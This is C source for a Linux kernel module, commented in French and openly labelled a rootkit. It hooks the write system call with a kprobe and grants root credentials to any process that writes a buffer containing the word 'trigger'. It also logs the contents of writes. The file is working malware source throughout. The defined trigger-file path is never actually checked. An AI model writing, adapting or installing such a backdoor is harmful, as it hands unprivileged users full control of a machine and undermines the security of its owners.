#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Rootkit - PrivEsc via write syscall sur un fichier spécifique");
MODULE_VERSION("0.4");

static struct kprobe kp;
void set_root(void);

// Nom du fichier déclencheur
#define TRIGGER_FILE "/home/testuser/root_trigger_write"

// Fonction pour élever les privilèges
void set_root(void)
{
    struct cred *root;

    printk(KERN_INFO "rootkit: Tentative d'obtention des privilèges root\n");

    root = prepare_creds();
    if (root == NULL) {
        printk(KERN_ERR "rootkit: Échec de la préparation des creds\n");
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
    printk(KERN_INFO "rootkit: Privilèges root obtenus avec succès\n");
}

// Pré-handler pour intercepter write
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    int fd;
    char __user *buffer;
    char kernel_buffer[256] = {0};

    printk(KERN_INFO "rootkit: handler_pre activé\n");

    // Récupérer le descripteur de fichier et le buffer utilisateur
    fd = regs->di;       // Premier argument de write
    buffer = (char __user *)regs->si; // Deuxième argument de write

    // Vérifier si le buffer utilisateur est accessible
    if (!access_ok(buffer, sizeof(kernel_buffer))) {
        printk(KERN_ERR "rootkit: Buffer utilisateur non accessible\n");
        return 0;
    }

    // Copier le contenu utilisateur dans le buffer noyau
    if (copy_from_user(kernel_buffer, buffer, sizeof(kernel_buffer) - 1)) {
        printk(KERN_ERR "rootkit: Échec de la copie depuis l'espace utilisateur\n");
        return 0;
    }
    kernel_buffer[sizeof(kernel_buffer) - 1] = '\0'; // Assurer la terminaison de chaîne

    printk(KERN_INFO "rootkit: Contenu écrit : %s\n", kernel_buffer);

    // Vérifier si le contenu contient "trigger"
    if (strstr(kernel_buffer, "trigger")) {
        printk(KERN_INFO "rootkit: Détection du déclencheur, élévation des privilèges\n");
        set_root();
    } else {
        printk(KERN_INFO "rootkit: Contenu non pertinent\n");
    }

    return 0; // Laisser le syscall continuer normalement
}

// Initialisation du module
static int __init rootkit_init(void)
{
    int ret;

    printk(KERN_INFO "rootkit: Initialisation\n");

    kp.symbol_name = "__x64_sys_write"; // Hook sur write
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Échec d'enregistrement du kprobe, code %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobe enregistré sur %s\n", kp.symbol_name);
    return 0;
}

// Nettoyage du module
static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe supprimé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
